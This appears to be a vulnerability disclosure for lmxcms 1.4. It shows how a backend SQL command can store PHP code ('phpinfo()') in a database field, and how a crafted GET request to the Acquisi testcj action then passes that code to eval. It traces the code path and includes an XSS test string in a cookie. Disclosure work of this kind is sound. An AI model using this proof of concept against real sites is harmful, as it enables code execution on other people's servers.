Code execution vulnerability in lmxcms v 1.4 backend via AcquisiModel.class.php file

Demonstration of the vulnerability

Go to the backend and click on the sql command execution module to insert a malicious command into the array segment of the lmx_cj_list table in the database lmxcms.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240829223833476.png)

The commands are as follows:

```sql
UPDATE `lmxcms`.`lmx_cj_list` SET `array` = 'phpinfo()' WHERE `lid` = 1;
```

Then get passes the parameter to make the method call

```
?m=Acquisi&a=testcj&lid=1
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240829224359635.png)

poc as follows：

```
GET /admin.php?m=Acquisi&a=testcj&lid=1 HTTP/1.1
Host: lmxcms:98
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; PHPSESSID=k5830lq3ng098vs3hakk99sho3; XDEBUG_SESSION=19501
Referer: http://localhost:98/admin.php?m=login&a=login
Priority: u=0, i
```

code analysis

In the fromatData() method of the AcquisiModel.class.php file, there is an eval function and variable control to get the array index value of the array parameter.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240829224612246.png)

 The caijiData() method makes a call to fromatData(), and `$data[0]` is the data obtained by querying the table lmx_ci_list against the lid.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240829224823728.png)

Continuing to explore the source, I found that testcj() makes another call to caijiData().

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240829225121120.png)

So visit /admin.php and make a call to the testcj() method and pass in the value of the corresponding array segment which is the lid value of the malicious code, i.e. the lid value corresponding to the malicious code inserted into the database at the top.

```
?m=Acquisi&a=testcj&lid=1
```

